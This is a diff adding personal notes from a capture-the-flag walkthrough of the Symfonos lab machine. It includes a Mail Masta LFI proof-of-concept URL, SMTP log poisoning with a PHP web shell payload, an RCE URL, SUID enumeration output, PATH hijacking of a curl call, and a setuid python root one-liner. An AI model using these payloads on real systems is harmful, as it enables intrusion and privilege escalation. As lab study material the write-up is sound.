@@ -648,7 +648,236 @@ Helios (also Helius) was the god of the Sun in Greek mythology. He was thought t
 - ran a quick searchsploit. got these: <br>
 ![[symfonosSearchSploitResultSS.png]]
 - yay two more vectors or something. `shellshock` and `greylisting daemon buffer overflow` added to pocket. lets see what they do. ill look into how to enumerate smtp first
-#### shellshock stuff:
+- connected with [[Telnet]], did an invalid `VRFY`, got `symfonos.local` as the server address and did `EHLO sympfonos.localdomain` and got this:
+```sh
+EHLO symfonos.localdomain
+250-symfonos.localdomain
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250 SMTPUTF8
+``` 
+- explanation: first line just...... you know what im feeling lazy. shitGPT can explain it better:
+	- `250-symfonos.localdomain` → Server greeting you back.
+	- `250-PIPELINING` → You can send multiple commands without waiting.
+	- `250-SIZE 10240000` → Max message size is ~10MB.
+	- `250-VRFY` → Supports `VRFY` (verify email addresses).
+	- `250-ETRN` → Can do remote queue handling.
+	- `250-STARTTLS` → You can upgrade to a secure TLS connection.
+	- `250-ENHANCEDSTATUSCODES` → More detailed status codes available.
+	- `250-8BITMIME` → Supports 8-bit MIME emails.
+	- `250-DSN` → Delivery Status Notifications supported.
+	- `250 SMTPUTF8` → UTF-8 email addresses supported.
+- made a checklist of stuff to check (see [[SMTP]]). first up is log poisoning
+	- https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/
+	- needs LFI
+	- i didnt look for LFI before. need to do more http enum
+## http enum 2:
+- gonna run a vuln scan with [[wpscan]] this time instead of just the uname enum 
+	- [[symfonos-wpscan vuln scan result]] 
+```sh
+[+] mail-masta
+ | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
+ |     References:
+ |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
+ |      - https://www.exploit-db.com/exploits/40290/
+ |      - https://www.exploit-db.com/exploits/50226/
+ |      - https://cxsecurity.com/issue/WLB-2016080220
+ |
+ | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
+ |     References:
+ |      - https://wpscan.com/vulnerability/c992d921-4f5a-403a-9482-3131c69e383a
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578
+ |      - https://www.exploit-db.com/exploits/41438/
+ |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
+```
+- LFI exists apparently. lets confirm: https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44/
+	- POC: `http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd` 
+	- yuuup works <br>
+![[symfonosMailMastaLFI.png]]
+- sooo we got the LFI. time to do some [[Log poisoning]] shenanigans
+- trying to read `/var/mail/mail.log` doesnt work. lemme get a list of all the possible mail log file locations
+- you know what im lazy i cant be bothered to manually test this shit. lemme see if theres a tool that automates LFI mapping
+- hell yeah https://github.com/kurobeats/fimap does the job perfectly
+	- fuck i need to mess around with python2 
+	- aaaaaaaaa python2 being depricated isnt helping at all 
+	- gonna deploy a docker instance with python2 
+		- AAAAAAAAAAAA its taking SO LONG why is the internet speed of the download in bps WTF im just gonna dig around manually. to hell with this automation
+- cant see log files. the user `helios` might have a mail file we can see
+- yup found the mail located at `/var/mail/helios` 
+- did `telnet IP PORT` to connect. tried to inject `<?php system($_GET["skibidi"]); ?>` in the RCPT at first and didnt work. then i injected it into the DATA portion and saw that the mail file at `/var/mail/helios` got updated. 
+- POC 2: `http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&skibidi=pwd` <br>
+![[symfonosPOC2SS.png]]
+- hell yeah got code exec. lets get an reverse shell real quick with [[oneLinerShells]]  
+- transfered it over to [[pwncat-cs]]. ran `run enumerate`. [[symfonosPwncatEnumerateOutput]] 
+- ran [[linpeas.sh]] as well. [[symfonosLinpeasOutput]]
+- an unknown SUID binary called `/opt/statuscheck` :0
+```sh
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                           
+strace Not Found                                                                                                                          
+-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device                                                                 
+-rwsr-xr-- 1 root messagebus 42K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                              
+-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 8.5K Jun 28  2019 /opt/statuscheck (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
+```
+- ran it. got this output: 
+```sh
+HTTP/1.1 200 OK
+Date: Wed, 28 May 2025 21:14:33 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
+ETag: "148-58c6b9bb3bc5b"
+Accept-Ranges: bytes
+Content-Length: 328
+Vary: Accept-Encoding
+Content-Type: text/html
+```
+- huh did a similar binary exploitation on a previous lab i think. lemme run strings real quick
+```sh
+(remote) helios@symfonos:/tmp$ strings /opt/statuscheck 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+system
+__cxa_finalize
+__libc_start_main
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_Jv_RegisterClasses
+_ITM_registerTMCloneTable
+GLIBC_2.2.5
+curl -I H
+http://lH
+ocalhostH
+AWAVA
+AUATL
+[]A\A]A^A_
+;*3$"
+GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.6972
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+prog.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+```
+- yuup runs binaries without the proper path. time to do some path shenanigans hqhqhqhqhq. lets identify usable binaries first:
+```sh
+curl
+```
+- made a fake `curl` in tmp that runs a reverse shell back to me and exported the `PATH` variable to look in `/tmp` first <br>
+![[symfonosPATHshenanigansSS.png]]
+- lets run it and see what happens
+- nothing. cant get a reverse shell. ykwhat ill just run `/bin/bash` locally instead
+- lets run it now
+- nothing wtf
+- OH bruh i havent given it execution perms yet skull emoji <br>
+![[images (5)(4).jpeg]]
+- gave it execution perms. ran it <br>
+![[symfonosPartialRootSS.png]]
+- hmmm partial root. doesnt feel satisfying. lets try to get full root
+- ran `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` 
+```sh
+(remote) root@symfonos:/root# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@symfonos:/root# id
+uid=0(root) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+```
+- got root uid. still groups and gid set to helios - __ - lets get absolute full root. <br>
+![[symfonosHASBEENROOTED.png]]
+- FULL ROOT LESSGOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
+#### shellshock stuff: 
 - ooh crafted env variables sent = RCE :0 
 	- https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html
-- lets check it out
